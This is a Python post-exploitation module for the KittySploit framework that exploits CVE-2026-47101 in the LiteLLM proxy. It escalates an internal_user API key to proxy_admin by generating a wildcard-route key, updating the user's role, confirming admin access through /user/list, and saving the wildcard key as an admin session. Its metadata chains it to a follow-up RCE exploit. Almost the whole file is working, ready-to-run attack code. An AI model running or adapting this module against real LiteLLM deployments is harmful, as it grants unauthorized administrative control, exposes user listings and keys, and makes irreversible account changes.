#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LiteLLM CVE-2026-47101 — post module (HTTP / API session or explicit keys)."""

from __future__ import annotations

import json
from typing import Any, Dict, Optional, Tuple

from kittysploit import *
from lib.exploit.handler import Handler
from lib.protocols.http.http_client import Http_client


class Module(Post, Http_client, Handler):
    __info__ = {
        "name": "LiteLLM proxy_admin Privesc (CVE-2026-47101)",
        "description": (
            "Post-exploitation variant of CVE-2026-47101: escalates an internal_user API key "
            "to proxy_admin via /key/generate (wildcard routes) and /user/update. "
            "Reads host, port, TLS, and keys from the active HTTP session when present."
        ),
        "author": ["learner202649", "KittySploit Team"],
        "cve": ["CVE-2026-47101"],
        "platform": Platform.MULTI,
        "session_type": [SessionType.HTTP, SessionType.HTTPS, SessionType.SHELL],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-47101",
            "https://github.com/learner202649/CVE-2026-47101-PoC",
        ],
        "tags": ["litellm", "privesc", "llm", "post", "cve-2026-47101"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "account_modification"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "admin_access"],
            "requires": {"tech_hints_any": ["litellm"], "capabilities_any": ["shell", "rce"]},
            "chain": {
                "consumes_capabilities": ["shell", "credentials"],
                "produces_capabilities": ["admin_access"],
                "suggested_followups": [
                    "exploits/multi/http/litellm_cve_2026_59822_rce",
                    "scanner/http/litellm_cve_2026_59822_detect",
                ],
            },
        },
    }

    port = OptPort(4000, "LiteLLM proxy port (overrides session)", required=False)
    ssl = OptBool(False, "Use HTTPS (overrides session when set)", required=False)
    master_key = OptString("", "Master key to bootstrap internal_user", required=False)
    user_key = OptString("", "Existing internal_user API key", required=False)
    user_id = OptString("", "User ID to escalate (auto-detect if empty)", required=False, advanced=True)
    confirm = OptBool(False, "Run full privesc chain (not detect-only)", required=True)

    def _session_blob(self) -> Dict[str, Any]:
        sid = self._session_id_value()
        if not sid or not self.framework:
            return {}
        sm = getattr(self.framework, "session_manager", None)
        if not sm:
            return {}
        session = sm.get_session(sid)
        if not session:
            return {}
        data = getattr(session, "data", None)
        return dict(data) if isinstance(data, dict) else {}

    def _apply_session_defaults(self) -> None:
        blob = self._session_blob()
        if not blob:
            return
        host = str(blob.get("host") or blob.get("rhost") or "").strip()
        if host and not str(getattr(self, "rhost", "") or "").strip():
            try:
                self.rhost = host
            except Exception:
                pass
        if blob.get("port") and int(self.port or 0) == 4000:
            try:
                self.port = int(blob.get("port"))
            except Exception:
                pass
        if blob.get("ssl") is not None and not bool(self.ssl):
            try:
                self.ssl = bool(blob.get("ssl"))
            except Exception:
                pass
        if not str(self.user_key or "").strip():
            for key in ("api_key", "user_key", "token", "bearer"):
                val = blob.get(key)
                if val:
                    self.user_key = str(val)
                    break
        if not str(self.master_key or "").strip() and blob.get("master_key"):
            self.master_key = str(blob.get("master_key"))
        if not str(self.user_id or "").strip() and blob.get("user_id"):
            self.user_id = str(blob.get("user_id"))

    def _api(self, method: str, path: str, token: str, body: Optional[dict] = None):
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        if method.upper() == "GET":
            return self.http_request("GET", path, headers=headers, allow_redirects=False)
        return self.http_request(
            "POST",
            path,
            headers=headers,
            json=body or {},
            allow_redirects=False,
        )

    @staticmethod
    def _json(resp) -> Dict[str, Any]:
        if not resp:
            return {}
        try:
            return resp.json()
        except Exception:
            return {"raw": resp.text or ""}

    def _create_internal_user(self, master: str) -> Tuple[str, str]:
        resp = self._api("POST", "/user/new", master, {"role": "internal_user"})
        data = self._json(resp)
        if not resp or int(resp.status_code or 0) >= 300:
            raise RuntimeError(f"/user/new failed: HTTP {getattr(resp, 'status_code', '?')} {data}")
        uid = data.get("user_id") or (data.get("user") or {}).get("user_id")
        key = data.get("key") or (data.get("user") or {}).get("key")
        if not uid or not key:
            raise RuntimeError(f"Unexpected /user/new response: {data}")
        return str(uid), str(key)

    def _detect_user_id(self, token: str) -> str:
        resp = self._api("GET", "/user/info", token)
        data = self._json(resp)
        if not resp or int(resp.status_code or 0) >= 300:
            raise RuntimeError(f"/user/info failed: {data}")
        uid = data.get("user_id") or data.get("user_id_value") or (data.get("user") or {}).get("user_id")
        if not uid:
            raise RuntimeError(f"Could not parse user_id: {data}")
        return str(uid)

    def _wildcard_key(self, token: str) -> str:
        resp = self._api("POST", "/key/generate", token, {"allowed_routes": ["/*"]})
        data = self._json(resp)
        if not resp or int(resp.status_code or 0) >= 300:
            raise RuntimeError(f"/key/generate failed: {data}")
        key = data.get("key") or data.get("token") or data.get("api_key")
        if not key:
            raise RuntimeError(f"No key in /key/generate response: {data}")
        return str(key)

    def _escalate(self, wildcard: str, uid: str) -> dict:
        resp = self._api(
            "POST",
            "/user/update",
            wildcard,
            {"user_id": uid, "user_role": "proxy_admin"},
        )
        data = self._json(resp)
        if not resp or int(resp.status_code or 0) >= 300:
            raise RuntimeError(f"/user/update failed: {data}")
        return data

    def _verify_admin(self, token: str) -> dict:
        resp = self._api("GET", "/user/list", token)
        data = self._json(resp)
        if not resp or int(resp.status_code or 0) >= 300:
            raise RuntimeError(f"/user/list denied: {data}")
        return data

    def check(self):
        self._apply_session_defaults()
        token = str(self.user_key or "").strip() or str(self.master_key or "").strip()
        if not token:
            return {
                "vulnerable": False,
                "reason": "Set user_key or master_key (or open a LiteLLM HTTP session with api_key)",
                "confidence": "low",
            }
        resp = self._api("GET", "/user/info", token)
        if resp and int(resp.status_code or 0) == 200:
            return {"vulnerable": True, "reason": "LiteLLM API accepts supplied key", "confidence": "medium"}
        return {"vulnerable": False, "reason": "LiteLLM API rejected key", "confidence": "medium"}

    def run(self):
        self._apply_session_defaults()
        print_status("CVE-2026-47101 — LiteLLM proxy_admin privesc (post)")
        chk = self.check()
        if not chk.get("vulnerable"):
            print_error(chk.get("reason", "Cannot reach LiteLLM API"))
            return False

        if not self.confirm:
            print_status("LiteLLM API reachable — set confirm=true to escalate")
            return True

        token = str(self.user_key or "").strip()
        uid = str(self.user_id or "").strip()
        master = str(self.master_key or "").strip()

        if not token:
            if not master:
                print_error("Provide user_key or master_key for escalation")
                return False
            print_status("Creating internal_user via master key...")
            uid, token = self._create_internal_user(master)
            print_success(f"internal_user user_id={uid}")

        if not uid:
            uid = self._detect_user_id(token)
            print_success(f"Target user_id={uid}")

        print_status("Generating wildcard-route API key...")
        wildcard = self._wildcard_key(token)
        print_success("Wildcard admin key obtained")

        print_status("Escalating to proxy_admin...")
        esc = self._escalate(wildcard, uid)
        print_info(json.dumps(esc, indent=2)[:2000])

        print_status("Verifying /user/list as proxy_admin...")
        listing = self._verify_admin(wildcard)
        print_success("Admin access confirmed on /user/list")
        print_info(json.dumps(listing, indent=2)[:4000])

        host = str(getattr(self, "rhost", None) or self.target or "127.0.0.1")
        session_id = self._create_session(
            host,
            int(self.port or 4000),
            "http",
            {
                "protocol": "http",
                "service": "litellm",
                "api_key": wildcard,
                "user_id": uid,
                "role": "proxy_admin",
                "cve": "CVE-2026-47101",
                "ssl": bool(self.ssl),
            },
        )
        if session_id:
            print_success(f"LiteLLM admin API session: {session_id}")
        return True
